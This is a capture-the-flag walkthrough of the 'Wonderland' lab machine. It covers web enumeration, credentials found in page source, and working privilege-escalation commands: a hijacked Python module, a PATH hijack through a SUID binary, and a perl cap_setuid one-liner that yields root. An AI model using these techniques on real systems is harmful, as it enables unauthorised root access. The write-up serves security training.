# Wonderland

1. `nmap` reveals SSH and HTTP services on standard ports.

2. `gobuster` on the web page reveals the following directories:

```
/img (Status: 301)
/poem (Status: 301)
/r (Status: 301)
```

Further investigation & guesses lead to the page `http://$TARGET_IP/r/a/b/b/i/t/` whose source contains some hidden credentials `alice:**REDACTED**`.

3. These credentials allow to log in as `alice` through SSH.

```
alice@wonderland:~$ ls -l
total 8
-rw------- 1 root root   66 May 25  2020 root.txt
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

We have the right to run `walrus_and_the_carpenter.py` as `rabbit`. This script imports the `random` module and picks 10 random lines in a hardcoded poem.

2. Let us hijack the `random` module by creating a `random.py` file in the directory to spawn a shell as `rabbit`.

```
alice@wonderland:~$ echo "import os; os.system('/bin/bash')" > random.py
alice@wonderland:~$ sudo -u rabbit python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ id
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

3. In its home directory, `rabbit` has a SUID executable (that does not seem to do anything interesting when we launch it).

```
rabbit@wonderland:/home/rabbit$ ls -l
total 20
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty
```

Because `strings` is not available on the target, we copy `teaParty` to `/tmp` for instance and bring it back to the local machine with `scp` using `alice`.

4. Using strings, we notice one interesting line in particular:

```
$ strings teaParty
...
/bin/echo -n 'Probably by ' && date --date='next hour' -R
...
```

`teaParty` seems to be invoking a shell line within which the `date` command is called with a relative path.

5. Back on the target machine, let us hijack the `date` command.

```
rabbit@wonderland:/home/rabbit$ echo /bin/bash > date
rabbit@wonderland:/home/rabbit$ chmod +x date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```
We get a shell as `hatter`.

6. Its home directory conveniently contains a `password.txt` file containing an anticipated piece of information allowing us to properly log in as `hatter` through SSH. It is not a sudoer. We look for interesting executables related to this user.

```
hatter@wonderland:~$ find / -group hatter -type f -executable 2>/dev/null
/usr/bin/perl5.26.1
/usr/bin/perl
...
hatter@wonderland:~$ ls -l /usr/bin/perl*
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl
-rwxr-xr-x 1 root root     10216 Nov 19  2018 /usr/bin/perl5.26-x86_64-linux-gnu
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl5.26.1
...
hatter@wonderland:~$ getcap /usr/bin/perl*
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.26.1 = cap_setuid+ep
```
We can run `/usr/bin/perl` (or equivalently `/usr/bin/perl5.26.1`), which has an [interesting capability](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#capabilities).

7. Time to [exploit this capability with perl](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) and finally become `root` and collect the **root flag** (in `/home/alice` as seen in step 3) as well as the **user flag** (in `/root`).

```
hatter@wonderland:~$ perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
root@wonderland:~# cat /home/alice/root.txt 
**REDACTED**
root@wonderland:~# cat /root/user.txt 
**REDACTED**
```
